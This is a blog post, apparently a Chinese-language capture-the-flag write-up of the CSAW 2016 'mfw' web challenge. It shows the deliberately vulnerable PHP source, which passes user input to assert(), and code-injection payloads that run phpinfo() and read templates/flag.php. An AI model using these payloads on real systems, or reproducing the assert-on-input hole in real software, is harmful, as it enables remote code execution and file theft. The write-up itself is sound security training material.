@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="BC">
+
+
+
+
+
+<title>csaw-ctf-2016-quals-mfw | BC&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">BC&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Link</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">BC&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Link</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">csaw-ctf-2016-quals-mfw</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">BC</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 26, 2020&nbsp;&nbsp;9:57:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h3><p>查看页面，发现其页面使用了git，尝试使用githack获取文件源码<br><img src="/images/XCTF/mfw1.png"></p>
+<p>成功获得网页源码：<br><img src="/images/XCTF/mfw2.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;$file&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line">li &lt;?php if ($page == &quot;home&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li &lt;?php if ($page == &quot;about&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li &lt;?php if ($page == &quot;contact&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=contact&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;!--&lt;li &lt;?php if ($page == &quot;flag&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=flag&quot;&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提到了flag.php，但页面中无法直接跳转到flag，猜测需要进行绕过。</p>
+<h3 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP5</span></span><br><span class="line">assert ( mixed $assertion [, <span class="keyword">string</span> $description ] ) : <span class="keyword">bool</span></span><br><span class="line"><span class="comment">// PHP7</span></span><br><span class="line">assert ( mixed $assertion [, <span class="built_in">Throwable</span> $exception ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+
+<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。<br>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">https://www.php.net/manual/zh/function.assert.php</a></p>
+<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。<br>语法：strpos(string,find,start)  </p>
+<ul>
+<li>string 必需。规定要搜索的字符串。</li>
+<li>find 必需。规定要查找的字符串。</li>
+<li>start 可选。规定在何处开始搜索。</li>
+</ul>
+<p>file_exists() 函数检查文件或目录是否存在  </p>
+<ul>
+<li>如果指定的文件或目录存在则返回 true，否则返回 false。</li>
+</ul>
+<p>构建payload：page=index.php’,’.php’) and phpinfo();//<br>有回显，成功显示phpinfo页面，接下来尝试进行构造，使其能够显示flag.php</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">page=<span class="string">&#x27;) or phpinfo();//即变成file_exists(&#x27;</span><span class="string">&#x27;) or phpinfo();结果为执行phpinfo()  </span></span><br><span class="line"><span class="string">page=&#x27;</span>) or print_r(file_get_contents(<span class="string">&#x27;templates/flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>查看源代码,得到flag</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>BC</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://youngbc.cn/2020/05/26/csaw-ctf-2016-quals-mfw/">https://youngbc.cn/2020/05/26/csaw-ctf-2016-quals-mfw/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/XCTF/"># XCTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/05/28/Flask-Jinja2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">Flask/Jinja2模板注入中的一些绕过姿势</a>
+            
+            
+            <a class="next" rel="next" href="/2020/05/24/GKCTF2020-wp/">GKCTF2020-wp(crypto)</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© BC </span>
+    </div>
+	<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+	<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">陕ICP备20005804号</a> 
+    <div>
+	<img src="/image/youpaiyun.png" width="5%" /></a>
+	<a href="http://www.beian.miit.gov.cn/" target="_blank" ></a>
+    </div>
+
+
+
+    </div>
+</body>
+</html>
